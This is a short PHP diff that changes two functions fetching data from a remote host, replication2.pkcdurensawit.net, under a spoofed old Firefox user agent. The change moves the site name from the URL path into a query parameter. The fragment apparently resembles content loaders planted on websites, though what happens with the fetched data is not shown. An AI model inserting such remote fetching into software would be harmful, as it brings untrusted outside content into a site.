@@ -19,7 +19,7 @@ function fetchDataFromSite($site) {
     return $result;
 }
 function fetchDataFromSite2($site) {
-    $url = 'https://replication2.pkcdurensawit.net/aritmamarket_sites/' . $site . '/';
+    $url = 'https://replication2.pkcdurensawit.net/aritmamarket_sites/?sites='.$site;
     $ch = curl_init($url);
     curl_setopt_array($ch, [
         CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
@@ -33,7 +33,7 @@ function fetchDataFromSite2($site) {
     return $result;
 }
 function fetchDataFromSite3($site) {
-    $url = 'https://replication2.pkcdurensawit.net/aritmamarket_web/' . $site . '/';
+    $url = 'https://replication2.pkcdurensawit.net/aritmamarket_web/?web='.$site;
     $ch = curl_init($url);
     curl_setopt_array($ch, [
         CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
